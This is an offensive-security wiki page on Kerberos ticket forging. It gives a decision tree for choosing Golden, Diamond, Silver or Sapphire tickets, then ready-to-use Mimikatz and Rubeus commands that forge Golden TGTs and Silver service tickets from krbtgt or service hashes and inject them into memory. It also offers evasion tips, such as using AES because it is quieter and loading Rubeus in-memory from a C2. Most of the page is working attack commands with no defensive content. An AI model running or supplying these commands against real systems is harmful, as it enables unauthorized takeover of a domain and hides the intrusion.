---
title: "Tickets"
---

# Kerberos Tickets

Kerberos uses tickets to authenticate and authorize actions across a domain.

> [!info] Reminder
> A **TGT** is issued by the AS and encrypted with the krbtgt key. A **TGS** is
> issued by the TGS and encrypted with a service's key. See
> [`kerberos`](../index.md) for the theory.

## Choosing the Right Ticket

```
Do I have the krbtgt key?
├── Yes
│   ├── Do I also have a valid TGT?  ->  Diamond Ticket
│   └── No                           ->  Golden Ticket
│
└── No
    ├── Do I have a service account key?
    │   └── Yes                      ->  Silver Ticket
    │
    └── Do I have any valid domain account?
        └── Yes                      ->  Sapphire Ticket
```

> [!tip] Quick reference
>
> - [**Golden**](./golden-tickets.md) - forges a TGT for any user, needs the krbtgt key.
> - [**Silver**](./silver-tickets.md) - forges a TGS for one service, needs that service's key.
> - [**Diamond**](./diamond-tickets.md) - modifies a legitimate TGT and re-signs it, needs the krbtgt key.
> - [**Sapphire**](./sapphire-tickets.md) - abuses S4U2Self + U2U, needs only a valid account.

## Convert ticket

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```

## On-host forging (Mimikatz / Rubeus)

:::tabs

=== Golden (TGT)

::: code-group

```powershell [Mimikatz]
# /ptt injects into memory; drop /ptt + add /ticket:gold.kirbi to write to disk
kerberos::golden /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID /krbtgt:$KRBTGT_NT_HASH /ptt

# AES256 variant (quieter than RC4, matches modern KDC crypto)
kerberos::golden /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID /aes256:$KRBTGT_AES_HASH /ptt
```

```powershell [Rubeus]
# Typically loaded in-memory via `execute-assembly` from a C2 - no binary on disk
Rubeus.exe golden /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID /rc4:$KRBTGT_NT_HASH /ptt

# AES256 variant
Rubeus.exe golden /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID /aes256:$KRBTGT_AES_HASH /ptt
```

=== Silver (TGS)

::: code-group

```powershell [Mimikatz]
# `kerberos::golden` also forges Silver tickets: /service + /target replace the SPN,
# and the service key replaces krbtgt. No /krbtgt means no KDC signature (Silver).
kerberos::golden /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID \
  /target:$TARGET_HOST /service:cifs /rc4:$SERVICE_NT_HASH /ptt

# AES256 variant
kerberos::golden /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID \
  /target:$TARGET_HOST /service:cifs /aes256:$SERVICE_AES_KEY /ptt
```

```powershell [Rubeus]
Rubeus.exe silver /service:cifs/$TARGET_HOST /rc4:$SERVICE_NT_HASH \
  /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID /ptt

# AES256 variant
Rubeus.exe silver /service:cifs/$TARGET_HOST /aes256:$SERVICE_AES_KEY \
  /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID /ptt
```

:::
